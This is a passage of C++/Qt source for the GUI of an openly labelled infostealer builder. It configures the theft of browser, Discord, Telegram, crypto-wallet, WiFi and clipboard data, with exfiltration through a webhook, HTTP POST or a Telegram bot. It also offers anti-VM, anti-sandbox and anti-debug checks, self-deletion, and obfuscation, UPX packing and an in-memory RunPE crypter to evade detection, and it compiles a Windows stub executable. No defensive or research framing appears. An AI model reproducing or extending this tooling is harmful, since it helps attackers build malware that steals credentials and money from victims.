    QVBoxLayout* compileLayout = new QVBoxLayout(compileGroup);
    compileLayout->setContentsMargins(15, 20, 15, 15);
    compileLayout->setSpacing(12);
    
    m_obfuscateCheck = new QCheckBox("🔐 Enable obfuscation & polymorphic junk code (unique signatures)", this);
    compileLayout->addWidget(m_obfuscateCheck);
    
    m_upxPackCheck = new QCheckBox("📦 Pack with UPX (requires UPX in PATH, reduces size)", this);
    compileLayout->addWidget(m_upxPackCheck);
    
    m_useCrypterCheck = new QCheckBox("🛡️  Use crypter (XOR encrypt + RunPE, no disk write)", this);
    m_useCrypterCheck->setToolTip("Wraps the stub in an encrypted loader that executes from memory only");
    compileLayout->addWidget(m_useCrypterCheck);
    
    mainLayout->addWidget(compileGroup);
    
    QGroupBox* compilerGroup = new QGroupBox("🔧 Compiler Selection", this);
    compilerGroup->setStyleSheet("QGroupBox { color: #ffc107; }");
    QFormLayout* compilerLayout = new QFormLayout(compilerGroup);
    compilerLayout->setContentsMargins(15, 20, 15, 15);
    compilerLayout->setSpacing(10);
    
    m_compilerCombo = new QComboBox(this);
    m_compilerCombo->addItem("Auto-detect");
    m_compilerCombo->setMinimumHeight(30);
    compilerLayout->addRow("🛠️  Compiler:", m_compilerCombo);
    
    m_compilerStatusLabel = new QLabel("Detecting compilers...", this);
    m_compilerStatusLabel->setStyleSheet("QLabel { color: #90caf9; font-style: italic; }");
    compilerLayout->addRow("📊 Status:", m_compilerStatusLabel);
    
    mainLayout->addWidget(compilerGroup);
    mainLayout->addStretch();
    
    m_tabWidget->addTab(tab, "Build Options");
}

void MainWindow::createBuildOutputArea() {
    m_buildOutputText = new QTextEdit(this);
    m_buildOutputText->setReadOnly(true);
    
    // Set monospace font explicitly
    // Liberation Mono is embedded and works on all platforms
    QFont consoleFont;
    consoleFont.setFamily("Liberation Mono");
    consoleFont.setPointSize(9);
    consoleFont.setStyleHint(QFont::Monospace);
    consoleFont.setFixedPitch(true);
    m_buildOutputText->setFont(consoleFont);
    
    m_buildOutputText->setStyleSheet(R"(
        QTextEdit {
            background-color: #0d1117;
            color: #58a6ff;
            border: 2px solid #30363d;
            border-radius: 6px;
            padding: 8px;
        }
    )");
    m_buildOutputText->setText("═══════════════════════════════════════════════════\n"
                               "  BUILD OUTPUT CONSOLE\n"
                               "═══════════════════════════════════════════════════\n"
                               "\n"
                               "Build output will appear here...\n"
                               "Configure your settings and click 'BUILD EXECUTABLE' to start.\n");
}

void MainWindow::onBuildClicked() {
    // Get configuration from UI
    StealerConfig config = getConfigFromUI();
    
    // Validate configuration
    if (config.outputName.isEmpty()) {
        QMessageBox::warning(this, "Invalid Configuration", "Please specify an output filename.");
        return;
    }
    
    // Check if at least one feature is enabled
    bool hasFeatures = config.grabChrome || config.grabFirefox || config.grabEdge || config.grabBrave ||
                       config.grabDiscord || config.grabTelegram || config.grabWallets ||
                       config.grabWifi || config.grabClipboard ||
                       config.collectHWID || config.collectIP || config.collectOSInfo ||
                       config.collectInstalledAV || config.collectProcessList || config.collectSpecs;
    
    if (!hasFeatures) {
        QMessageBox::warning(this, "Invalid Configuration", 
            "Please configure at least one feature (grabber or system info).");
        return;
    }
    
    // Check if exfiltration is configured when grabbing data
    bool hasGrabbing = config.grabChrome || config.grabFirefox || config.grabEdge || config.grabBrave ||
                       config.grabDiscord || config.grabTelegram || config.grabWallets;
    
    if (hasGrabbing && config.webhookUrl.isEmpty() && config.httpPostUrl.isEmpty() && config.telegramToken.isEmpty()) {
        QMessageBox::warning(this, "Invalid Configuration", 
            "You have enabled data grabbing but no exfiltration method is configured.");
        return;
    }
    
    m_buildOutputText->clear();
    m_buildOutputText->append("═══════════════════════════════════════════════════\n");
    m_buildOutputText->append("  BUILD PROCESS STARTED\n");
    m_buildOutputText->append("═══════════════════════════════════════════════════\n\n");
    
    // Generate stub source code
    m_buildOutputText->append("[1/3] Generating stub source code...\n");
    
    QString tempDir = QDir::tempPath();
    QString stubPath = tempDir + "/stub_temp.cpp";
    QString outputPath = QDir::currentPath() + "/" + config.outputName;
    
    if (!m_stubGenerator->saveStubToFile(stubPath, config)) {
        QMessageBox::critical(this, "Error", "Failed to generate stub source code.");
        m_buildOutputText->append("ERROR: Failed to generate stub source code.\n");
        return;
    }
    
    m_buildOutputText->append("✓ Stub source generated successfully!\n");
    m_buildOutputText->append("  Source: " + stubPath + "\n");
    m_buildOutputText->append("  Target: " + outputPath + "\n\n");
    m_buildOutputText->append("[2/3] Compiling Windows executable...\n");
    
    // Disable build button during build
    m_buildButton->setEnabled(false);
    
    // Start build process
    m_builder->build(stubPath, outputPath, config, m_compilerManager);
}

void MainWindow::onSaveConfigClicked() {
    QString filename = QFileDialog::getSaveFileName(this, "Save Configuration", "", "JSON Files (*.json)");
    if (!filename.isEmpty()) {
        StealerConfig config = getConfigFromUI();
        if (config.saveToFile(filename)) {
            QMessageBox::information(this, "Success", "Configuration saved successfully.");
        } else {
            QMessageBox::critical(this, "Error", "Failed to save configuration.");
        }
    }
}

void MainWindow::onLoadConfigClicked() {
    QString filename = QFileDialog::getOpenFileName(this, "Load Configuration", "", "JSON Files (*.json)");
    if (!filename.isEmpty()) {
        StealerConfig config;
        if (config.loadFromFile(filename)) {
            loadConfigToUI(config);
            QMessageBox::information(this, "Success", "Configuration loaded successfully.");
        } else {
            QMessageBox::critical(this, "Error", "Failed to load configuration.");
        }
    }
}

void MainWindow::onCompilerDetected() {
    QStringList compilers = m_compilerManager->getAvailableCompilers();
    
    m_compilerCombo->clear();
    m_compilerCombo->addItem("Auto-detect");
    m_compilerCombo->addItems(compilers);
    
    if (compilers.isEmpty()) {
        m_compilerStatusLabel->setText("✗ No compilers found!");
        m_compilerStatusLabel->setStyleSheet("QLabel { color: #ff5252; font-weight: bold; font-size: 10pt; }");
        m_buildButton->setEnabled(false);
        
        QString message = "No suitable Windows compiler found.\n\n";
        
#ifdef Q_OS_WIN
        message += "Please install one of the following:\n\n";
        message += "• Visual Studio 2019+ with C++ tools\n";
        message += "  https://visualstudio.microsoft.com/\n\n";
        message += "• MinGW-w64\n";
        message += "  https://www.mingw-w64.org/\n";
#else
        message += "Please install MinGW-w64 cross-compiler:\n\n";
        if (m_compilerManager->canAutoInstallMinGW()) {
            message += "Run this command:\n";
            message += "$ " + m_compilerManager->getMinGWInstallCommand() + "\n";
        } else {
            message += "Install mingw-w64 using your package manager\n";
        }
#endif
        
        QMessageBox::warning(this, "No Compiler Found", message);
    } else {
        m_compilerStatusLabel->setText("✓ " + compilers.join(", "));
        m_compilerStatusLabel->setStyleSheet("QLabel { color: #69f0ae; font-weight: bold; font-size: 10pt; }");
        m_buildButton->setEnabled(true);
        
        m_buildOutputText->append("\n✓ Compiler(s) detected: " + compilers.join(", ") + "\n");
        m_buildOutputText->append("Ready to build!\n");
    }
}

void MainWindow::onBuildProgress(const QString& message) {
    m_buildOutputText->append(message);
}

void MainWindow::onBuildFinished(bool success) {
    m_buildButton->setEnabled(true);
    
    if (success) {
        m_buildOutputText->append("\n═══════════════════════════════════════════════════\n");
        m_buildOutputText->append("  BUILD SUCCESSFUL!\n");
        m_buildOutputText->append("═══════════════════════════════════════════════════\n");
        m_buildOutputText->append("\nYour Windows executable is ready!\n");
        m_buildOutputText->append("Output: " + getConfigFromUI().outputName + "\n");
        m_buildOutputText->append("Location: " + QDir::currentPath() + "\n");
        
        QMessageBox::information(this, "Build Complete", 
            "Executable built successfully!\n\n"
            "Output: " + getConfigFromUI().outputName + "\n"
            "Location: " + QDir::currentPath());
    } else {
        m_buildOutputText->append("\n═══════════════════════════════════════════════════\n");
        m_buildOutputText->append("  BUILD FAILED\n");
        m_buildOutputText->append("═══════════════════════════════════════════════════\n");
        m_buildOutputText->append("Error: " + m_builder->getLastError() + "\n");
        
        // Auto-open Dependencies tab on build failure
        int dependenciesTabIndex = m_tabWidget->count() - 1;  // Last tab
        m_tabWidget->setCurrentIndex(dependenciesTabIndex);
        
        QMessageBox::critical(this, "Build Failed", 
            "Failed to build executable.\n\n"
            "Error: " + m_builder->getLastError() + "\n\n"
            "Check the build output and Dependencies tab for installation instructions.");
    }
}

void MainWindow::onOutputReceived(const QString& output) {
    m_buildOutputText->append(output);
}

void MainWindow::loadConfigToUI(const StealerConfig& config) {
    // Grabber
    m_grabChromeCheck->setChecked(config.grabChrome);
    m_grabFirefoxCheck->setChecked(config.grabFirefox);
    m_grabEdgeCheck->setChecked(config.grabEdge);
    m_grabBraveCheck->setChecked(config.grabBrave);
    m_grabDiscordCheck->setChecked(config.grabDiscord);
    m_grabTelegramCheck->setChecked(config.grabTelegram);
    m_grabWalletsCheck->setChecked(config.grabWallets);
    m_grabWifiCheck->setChecked(config.grabWifi);
    m_grabClipboardCheck->setChecked(config.grabClipboard);
    m_captureScreenCheck->setChecked(config.captureScreen);
    
    // Exfiltration
    m_webhookUrlEdit->setText(config.webhookUrl);
    m_httpPostUrlEdit->setText(config.httpPostUrl);
    m_telegramTokenEdit->setText(config.telegramToken);
    m_telegramChatIdEdit->setText(config.telegramChatId);
    
    
    // System info
    m_collectHWIDCheck->setChecked(config.collectHWID);
    m_collectIPCheck->setChecked(config.collectIP);
    m_collectOSInfoCheck->setChecked(config.collectOSInfo);
    m_collectInstalledAVCheck->setChecked(config.collectInstalledAV);
    m_collectProcessListCheck->setChecked(config.collectProcessList);
    m_collectSpecsCheck->setChecked(config.collectSpecs);
    
    // Stealth
    m_processNameEdit->setText(config.processName);
    m_mutexNameEdit->setText(config.mutexName);
    m_selfDestructCheck->setChecked(config.selfDestruct);
    m_meltFileCheck->setChecked(config.meltFile);
    
    // Anti-analysis
    m_antiVMCheck->setChecked(config.antiVM);
    m_antiSandboxCheck->setChecked(config.antiSandbox);
    m_antiDebugCheck->setChecked(config.antiDebug);
    m_sleepEvasionCheck->setChecked(config.sleepEvasion);
    
    // Build
    m_outputNameEdit->setText(config.outputName);
    m_iconPathEdit->setText(config.iconPath);
    m_architectureCombo->setCurrentText(config.architecture);
    m_obfuscateCheck->setChecked(config.obfuscate);
    m_upxPackCheck->setChecked(config.upxPack);
    m_useCrypterCheck->setChecked(config.useCrypter);
}

StealerConfig MainWindow::getConfigFromUI() const {
    StealerConfig config;
    
    // Grabber
    config.grabChrome = m_grabChromeCheck->isChecked();
    config.grabFirefox = m_grabFirefoxCheck->isChecked();
    config.grabEdge = m_grabEdgeCheck->isChecked();
    config.grabBrave = m_grabBraveCheck->isChecked();
    config.grabDiscord = m_grabDiscordCheck->isChecked();
    config.grabTelegram = m_grabTelegramCheck->isChecked();
    config.grabWallets = m_grabWalletsCheck->isChecked();
    config.grabWifi = m_grabWifiCheck->isChecked();
    config.grabClipboard = m_grabClipboardCheck->isChecked();
    config.captureScreen = m_captureScreenCheck->isChecked();
    
    // Exfiltration
    config.webhookUrl = m_webhookUrlEdit->text();
    config.httpPostUrl = m_httpPostUrlEdit->text();
    config.telegramToken = m_telegramTokenEdit->text();
    config.telegramChatId = m_telegramChatIdEdit->text();
    
    
    // System info
    config.collectHWID = m_collectHWIDCheck->isChecked();
    config.collectIP = m_collectIPCheck->isChecked();
    config.collectOSInfo = m_collectOSInfoCheck->isChecked();
    config.collectInstalledAV = m_collectInstalledAVCheck->isChecked();
    config.collectProcessList = m_collectProcessListCheck->isChecked();
    config.collectSpecs = m_collectSpecsCheck->isChecked();
    
    // Stealth
    config.processName = m_processNameEdit->text();
    config.mutexName = m_mutexNameEdit->text();
    config.selfDestruct = m_selfDestructCheck->isChecked();
    config.meltFile = m_meltFileCheck->isChecked();
    
    // Anti-analysis
    config.antiVM = m_antiVMCheck->isChecked();
    config.antiSandbox = m_antiSandboxCheck->isChecked();
    config.antiDebug = m_antiDebugCheck->isChecked();
    config.sleepEvasion = m_sleepEvasionCheck->isChecked();
    
    // Build
    config.outputName = m_outputNameEdit->text();
    config.iconPath = m_iconPathEdit->text();
    config.architecture = m_architectureCombo->currentText();
    config.obfuscate = m_obfuscateCheck->isChecked();
    config.upxPack = m_upxPackCheck->isChecked();
    config.useCrypter = m_useCrypterCheck->isChecked();
    
    int compilerIndex = m_compilerCombo->currentIndex();
    if (compilerIndex == 0) {
        config.compiler = "auto";
    } else {
        config.compiler = m_compilerCombo->currentText();
    }
    
    return config;
}


